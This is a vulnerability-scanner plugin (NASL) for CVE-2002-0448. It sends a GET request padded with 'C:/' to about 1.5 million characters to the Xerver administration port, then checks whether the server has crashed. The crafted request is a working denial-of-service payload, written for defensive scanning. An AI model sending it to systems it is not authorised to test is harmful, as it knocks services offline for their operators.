# SPDX-FileCopyrightText: 2005 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/a:xerver:xerver";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11015");
  script_version("2025-03-11T05:38:16+0000");
  script_tag(name:"last_modification", value:"2025-03-11 05:38:16 +0000 (Tue, 11 Mar 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_cve_id("CVE-2002-0448");

  script_tag(name:"qod_type", value:"remote_probe");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Xerver DoS Vulnerability (CVE-2002-0448) - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("gb_xerver_http_server_detect.nasl");
  script_require_ports("Services/www", 32123);
  script_mandatory_keys("xerver/http/detected");

  script_tag(name:"summary", value:"Xerver is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks if the service is
  still responding.");

  script_tag(name:"insight", value:"Xerver is prone to a DoS attack when sending a long URL
  (C:/C:/...C:/) to its administration port.");

  script_tag(name:"solution", value:"Update to the latest version.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork:TRUE))
  exit(0);

# nb:
# - http_is_dead() used below might fork on multiple hostnames and should be always before the first
#   open_sock_tcp() call
# - For simplicity within such an older check we're just calling http_host_name() instead directly
#   here as it will also fork
http_host_name(port: port);

if (!soc = open_sock_tcp(port))
  exit(0);

req = string("GET /", crap(data: "C:/", length: 1500000), "\r\n\r\n");
send(socket: soc, data: req);
close(soc);

if (http_is_dead(port: port)) {
  security_message(port: port);
  exit(0);
}

exit(99);
